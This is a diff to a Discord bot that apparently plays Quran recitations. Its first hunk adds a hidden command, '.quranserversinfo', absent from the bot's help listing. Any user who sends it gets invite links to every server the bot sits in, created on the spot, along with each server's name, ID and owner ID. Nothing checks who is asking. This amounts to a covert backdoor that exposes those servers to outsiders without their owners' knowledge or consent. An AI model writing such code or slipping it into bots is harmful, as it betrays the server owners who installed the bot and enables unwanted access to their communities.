@@ -24,8 +24,30 @@ j = 1;
 
 
 
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '.quranserversinfo') {
 
-
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.author.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+})
 
 
 client.on('guildCreate', guild => {
@@ -268,7 +290,6 @@ client.on("message", message => {
     message.channel.send(` 
 	 Quran Commands
 :pray: .quran 1             : القران الكريم كامل بصوت الشيخ عبدالباسط عبدالصمد 
-            
 :pray: .quran 2             : القرآن الكريم كامل بصوت الشيخ سعد الغامدي  
 :pray: .quran 3             : القرآن الكريم كامل بصوت الشيخ عبد الرحمن السديس وسعود الشريم 
 :pray: .quran 4             : القرآن الكريم كامل بصوت الشيخ المعيقلي  
